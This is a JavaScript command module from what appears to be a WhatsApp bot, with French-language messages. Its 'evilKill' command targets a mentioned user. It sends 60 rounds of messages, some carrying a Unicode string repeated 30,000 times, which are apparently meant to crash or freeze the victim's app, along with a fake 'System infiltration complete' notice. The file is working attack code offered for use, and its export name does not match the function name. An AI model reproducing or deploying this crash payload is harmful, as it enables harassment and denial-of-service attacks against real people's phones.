// /commands/bug/evil-kill.js
import channelSender from '../tools/channelSender.js';

async function evilKill(message, client) {
    try {
        const remoteJid = message.key?.remoteJid;
        if (!remoteJid) throw new Error("Message JID is undefined.");

        const user = message.pushName || 'User';
        const date = new Date().toLocaleString();

        await client.sendMessage(remoteJid, {
            text: `
╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮
┃         🎴𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫🎴
┃         𝐄𝐕𝐈𝐋-𝐊𝐈𝐋𝐋 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯
│  ❃ 𝗢𝘄𝗻𝗲𝗿 : 🎴 𝑫𝛯𝑽 ᬁ 𝛫𝑈𝑅𝛩𝛮𝛥🎴
│  ❃ 𝗠𝗼𝗱𝗲 : Public
│  ❃ 𝗨𝘀𝗲𝗿 : ${user}
│  ❃ 𝗣𝗿𝗲𝗳𝗶𝘅 : [ . ]
│  ❃ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : v1.0.0
│  ❃ 𝗗𝗮𝘁𝗲 : ${date}
╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯
⿻🎴𝛫𝑈𝑅𝛩𝛮𝛥🎴\n\nTentative de chaos sur la cible en cours...`
        });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
        const commandAndArgs = messageBody.slice(1).trim();
        const parts = commandAndArgs.split(/\s+/);
        const args = parts.slice(1);

        let participant;
        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            participant = message.message.extendedTextMessage.contextInfo.participant;
        } else if (args.length > 0) {
            participant = args[0].replace('@', '') + '@s.whatsapp.net';
        } else {
            throw new Error('Veuillez mentionner la personne à cibler.');
        }

        const num = '@' + participant.replace('@s.whatsapp.net', '');

        for (let i = 0; i < 60; i++) {
            await evilBug2(message, client, participant);
            await evilBug1(message, client, participant);
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        await channelSender(message, client, `✅ Chaos envoyé avec succès à ${num}.\n\nMerci d'utiliser le service.`, 4);

    } catch (error) {
        console.error("Erreur dans evilKill:", error);
        await client.sendMessage(message.key.remoteJid, {
            text: `⚠️ Une erreur est survenue : ${error.message}`
        });
    }
}

async function evilBug1(message, client, participant) {
    try {
        await client.relayMessage(
            participant,
            {
                ephemeralMessage: {
                    message: {
                        extendedTextMessage: {
                            text: `⿻🎴𝛫𝑈𝑅𝛩𝛮𝛥🎴 domination unleashed\n${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(30000)}\n\n`,
                            contextInfo: { mentionedJid: [participant] }
                        }
                    }
                }
            },
            { participant: { jid: participant } }
        );
    } catch (error) {
        console.error("Erreur dans evilBug1:", error);
    }
}

async function evilBug2(message, client, participant) {
    try {
        await client.relayMessage(
            participant,
            {
                viewOnceMessage: {
                    message: {
                        extendedTextMessage: {
                            text: "System infiltration complete...",
                            contextInfo: { mentionedJid: [participant] }
                        }
                    }
                }
            },
            { participant: { jid: participant } }
        );
    } catch (error) {
        console.error("Erreur dans evilBug2:", error);
    }
}

export default evilkill;
